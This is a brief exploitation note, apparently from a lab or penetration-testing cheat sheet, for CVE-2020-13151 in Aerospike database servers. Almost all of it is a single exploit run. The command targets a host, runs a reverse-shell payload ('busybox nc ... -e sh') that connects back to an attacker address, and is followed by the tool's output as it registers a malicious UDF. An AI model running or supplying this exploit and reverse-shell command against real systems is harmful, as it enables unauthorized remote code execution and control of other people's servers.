# CVE-2020-13151 - Aerospike (ports 3000, 3001, 3002)

https://github.com/b4ny4n/CVE-2020-13151

```bash
python3 cve2020-13151.py --ahost 192.168.247.143 --cmd 'busybox nc 192.168.45.241 443 -e sh'
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote reQsISjyQXkMPITT
[+] registering udf
[+] issuing command "busybox nc 192.168.45.241 443 -e sh"
[-] UDF execution returned Client timeout: socket=30000 total=1000 iterations=1 lastNode=192.168.247.143:3000
```
